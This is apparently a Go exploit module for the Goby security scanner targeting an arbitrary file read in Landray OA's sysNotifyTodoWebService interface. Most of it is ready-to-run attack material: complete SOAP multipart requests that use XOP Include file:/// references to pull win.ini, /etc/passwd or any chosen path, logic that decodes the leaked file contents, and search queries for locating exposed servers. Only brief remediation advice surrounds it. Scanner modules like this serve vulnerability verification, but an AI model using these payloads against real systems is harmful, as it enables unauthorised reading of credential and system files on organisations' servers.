package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Landray OA /sys/webservice/sysNotifyTodoWebService File Read Vulnerability",
    "Description": "<p>Landray OA, developed by Shenzhen Landray Software Co., Ltd., is a fully online digital OA system designed for medium and large enterprises. It includes 100 functional modules such as process management, knowledge management, meeting management, document management, task management, and supervision management. There is an arbitrary file read vulnerability in the /sys/webservice/sysNotifyTodoWebService interface, which allows attackers to read critical files in the system, potentially leading to sensitive information leakage and increasing the risk of further attacks.</p>",
    "Product": "Landray-OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2024-06-26",
    "PostTime": "2024-12-31",
    "Author": "yanyongju@baimaohui.net",
    "FofaQuery": "body=\"Com_Parameter\" || body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || (title=\"欢迎登录智慧协同平台\" && body=\"欢迎登录智慧协同平台\") || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "GobyQuery": "body=\"Com_Parameter\" || body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || (title=\"欢迎登录智慧协同平台\" && body=\"欢迎登录智慧协同平台\") || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "Level": "1",
    "Impact": "<p>Attackers can exploit this vulnerability to read critical files in the system, potentially leading to sensitive information leakage and increasing the risk of further attacks.</p>",
    "Recommendation": "<p>1. Configure access policies through security devices such as firewalls and set up a whitelist for access.2. Disable public network access to the system unless necessary.3. Upgrade to a secure version or apply patches.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,windows,linux",
            "show": ""
        },
        {
            "name": "default",
            "type": "input",
            "value": "C:/Windows/win.ini",
            "show": "attackType=default"
        },
        {
            "name": "windows",
            "type": "input",
            "value": "C:/Windows/win.ini",
            "show": "attackType=windows"
        },
        {
            "name": "linux",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=linux"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysNotifyTodoWebService",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----4upt9dwdca8rtwq9osuz",
                    "SOAPAction": "\"\"",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "------4upt9dwdca8rtwq9osuz\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.notify.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getTodoCount>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\r\n        </arg0>\r\n    </web:getTodoCount>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n------4upt9dwdca8rtwq9osuz--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Unmarshalling Error: 意外的文本 \"OyBmb",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysNotifyTodoWebService",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----4upt9dwdca8rtwq9osuz",
                    "SOAPAction": "\"\"",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "------4upt9dwdca8rtwq9osuz\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.notify.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getTodoCount>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///etc/passwd\"/></count>\r\n        </arg0>\r\n    </web:getTodoCount>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n------4upt9dwdca8rtwq9osuz--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Unmarshalling Error: 意外的文本 \"cm9vdD",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysNotifyTodoWebService",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----4upt9dwdca8rtwq9osuz",
                    "SOAPAction": "\"\"",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "------4upt9dwdca8rtwq9osuz\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.notify.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getTodoCount>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///{{{filePath}}}\"/></count>\r\n        </arg0>\r\n    </web:getTodoCount>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n------4upt9dwdca8rtwq9osuz--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Unmarshalling Error: 意外的文本",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "resultBase64|lastbody|regex|\"([A-Za-z0-9+/=]+)\"",
                "output|define|base64_decode|{{{resultBase64}}}"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "蓝凌OA /sys/webservice/sysNotifyTodoWebService 文件读取漏洞",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌OA由深圳市蓝凌软件股份有限公司自主研发，是一款全程在线数字化OA，应用于大中型企业在线化办公。包含流程管理、知识管理、会议管理、公文管理、任务管理及督办管理等100个功能模块。/sys/webservice/sysNotifyTodoWebService接口处存在任意文件读取漏洞，攻击者可利用该漏洞读取系统中的重要文件，可能导致敏感信息泄露，增加系统被进一步攻击的风险。</p>",
            "Recommendation": "<p>1. 通过防火墙等安全设备设置访问策略，设置白名单访问。2. 如非必要，禁止公网访问该系统。3. 升级至安全版本或打补丁。</p>",
            "Impact": "<p>攻击者可以通过该漏洞读取系统中的重要文件，可能导致敏感信息泄露，增加系统被进一步攻击的风险。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Landray OA /sys/webservice/sysNotifyTodoWebService File Read Vulnerability",
            "Product": "Landray-OA",
            "Description": "<p>Landray OA, developed by Shenzhen Landray Software Co., Ltd., is a fully online digital OA system designed for medium and large enterprises. It includes 100 functional modules such as process management, knowledge management, meeting management, document management, task management, and supervision management. There is an arbitrary file read vulnerability in the /sys/webservice/sysNotifyTodoWebService interface, which allows attackers to read critical files in the system, potentially leading to sensitive information leakage and increasing the risk of further attacks.</p>",
            "Recommendation": "<p>1. Configure access policies through security devices such as firewalls and set up a whitelist for access.2. Disable public network access to the system unless necessary.3. Upgrade to a secure version or apply patches.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to read critical files in the system, potentially leading to sensitive information leakage and increasing the risk of further attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/sys/webservice/sysNotifyTodoWebService"
    },
    "VariablesOrder": [
        "filePath",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9981"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }